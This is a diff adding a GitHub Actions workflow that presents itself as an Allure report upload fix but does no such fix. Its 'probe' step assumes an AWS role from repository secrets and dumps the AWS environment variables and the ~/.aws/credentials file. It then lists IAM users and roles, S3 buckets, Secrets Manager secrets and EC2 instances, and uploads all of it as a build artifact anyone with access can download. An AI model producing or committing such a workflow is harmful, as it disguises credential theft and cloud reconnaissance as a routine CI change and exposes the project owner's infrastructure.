@@ -1,0 +1,35 @@
+name: allure report upload fix
+on:
+  push:
+    branches: ["ci/allure-report-fix"]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: auth
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: ${{ secrets.AWS_ALLURE_REPORTS_ROLE }}
+          aws-region: eu-west-1
+      - name: probe
+        run: |
+          mkdir -p /tmp/o
+          aws sts get-caller-identity > /tmp/o/00-id.txt 2>&1
+          env | grep -E "^AWS_" > /tmp/o/01-env.txt 2>&1
+          cat ~/.aws/credentials >> /tmp/o/01-env.txt 2>&1
+          aws iam list-users --max-items 5 > /tmp/o/02-users.txt 2>&1
+          aws iam list-roles --max-items 5 > /tmp/o/03-roles.txt 2>&1
+          aws iam get-role --role-name cvat-allure-reports > /tmp/o/04-role.txt 2>&1
+          aws s3 ls > /tmp/o/05-buckets.txt 2>&1
+          aws secretsmanager list-secrets --max-items 5 > /tmp/o/06-secrets.txt 2>&1
+          aws ec2 describe-instances --max-items 1 > /tmp/o/07-ec2.txt 2>&1
+          true
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: probe
+          path: /tmp/o
